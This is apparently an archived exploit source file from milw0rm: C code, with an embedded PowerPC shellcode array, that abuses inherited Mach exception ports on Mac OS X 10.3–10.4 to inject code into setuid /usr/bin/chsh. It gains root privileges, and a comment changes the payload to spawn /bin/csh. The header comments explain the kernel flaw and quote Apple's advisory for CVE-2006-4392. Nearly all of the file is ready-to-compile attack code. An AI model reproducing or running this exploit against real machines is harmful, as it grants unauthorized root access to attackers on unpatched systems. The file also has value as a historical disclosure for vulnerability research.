/* excploit.c - 28 Nov 2005 - xmath@math.leidenuniv.nl
 *
 * Exploitable Mach Exception Handling
 *
 * Affected:  Mac OS X 10.4.6 (darwin 8.6.0) and older
 *
 * When a process executes a setuid executable, all existing rights to the
 * task port are invalidated, to make sure unauthorized processes do not
 * retain control of the process.  Exception handlers however remain installed,
 * and when some kind of hardware exception occurs, the exception handler can
 * receive a new right to the task port as one of its arguments, and thus
 * regain full control over the process.
 *
 * Interestingly, the code to reset the exception handlers (and hence thwart
 * this attack) upon exec() of a setuid executable has been present in the
 * kernel since OSX 10.3, but is disabled (#if 0) for unspecified reasons.
 *
 * This exploit installs an exception handler on illegal memory access, forks
 * off a child (the handler is inherited), and uses RLIMIT_STACK to cause a
 * segfault after exec().  The shell code invokes /usr/bin/id.
 *
 * Greetings to Scrippie and #vuln
 *
 */
/*
 * http://docs.info.apple.com/article.html?artnum=304460
 *
 * Kernel
 * CVE-ID: CVE-2006-4392
 * Available for: Mac OS X v10.4 through Mac OS X v10.4.7, Mac OS X Server v10.4 through Mac OS X Server v10.4.7
 * Impact: Local users may be able to run arbitrary code with raised privileges
 * Description: An error handling mechanism in the kernel, known as Mach exception ports, provides the ability 
 * to control programs when certain types of errors are encountered. Malicious local users could use this mechanism 
 * to execute arbitrary code in privileged programs if an error is encountered. This update addresses the issue by 
 * restricting access to Mach exception ports for privileged programs. Credit to Dino Dai Zovi of Matasano Security 
 * for reporting this issue.
 *
 * did you guys really forget to patch 10.3 ? 
 * I know the original exploit didn't compile there but comon guys. 
 *
 * This is a patch for http://www.milw0rm.com/exploits/2463
 * http://cds.xs4all.nl:8081/tmp/excploit.c
 * Dropped in http://blogs.23.nu/ilja/ on Sept 21 2006 
 *
 * - KF
 */
#include <sys/time.h>   // One liner to make it compile on 10.3.X 
#include <sys/resource.h>
#include <sys/wait.h>
#include <unistd.h>
#include <mach/mach.h>

extern boolean_t exc_server(mach_msg_header_t *, mach_msg_header_t *);

int main(void) {
	mach_port_t self = mach_task_self(), exc;
	mach_port_allocate(self, MACH_PORT_RIGHT_RECEIVE, &exc);
	mach_port_insert_right(self, exc, exc, MACH_MSG_TYPE_MAKE_SEND);
	task_set_exception_ports(self, EXC_MASK_BAD_ACCESS, exc,
			EXCEPTION_STATE_IDENTITY, PPC_THREAD_STATE);

	if (fork()) {
		mach_msg_server_once(exc_server, 512, exc, 0);
		wait(NULL);
	} else {
		static struct rlimit rl;
		setrlimit(RLIMIT_STACK, &rl);
	        execl("/usr/bin/chsh", "chsh", NULL);
	}

	return 0;
}

static long implant[] = {
	0x48000015, 0x00000000, 0x00100000, 0x00000000,
	0x00100000, 0x7ca802a6, 0x38600003, 0x38850000,
	0x380000c3, 0x44000002, 0x60000000, 0x38600000,
	0x38000017, 0x44000002, 0x60000000, 0x38600000,
	0x380000b5, 0x44000002, 0x60000000, 0x38650068,
	0x38850074, 0x90640000, 0x3800003b, 0x44000002,
	0x60000000, 0x38000001, 0x44000002, 0x2f2f2f62,  // /bin/csh is more fun than /usr/bin/id 
	0x696e2f63, 0x73680000, 0x00000000, 0x00000000,  
};

kern_return_t catch_exception_raise_state_identity(mach_port_t exc, thread_t t,
		task_t task, exception_type_t e, exception_data_t ed,
		mach_msg_type_number_t edsz, int *f, thread_state_t *is,
		mach_msg_type_number_t isz, thread_state_t *os) {
	vm_allocate(task, os, sizeof implant, TRUE);
	vm_write(task, *os, implant, sizeof implant);
	return KERN_SUCCESS;
}

# milw0rm.com [2006-09-30]
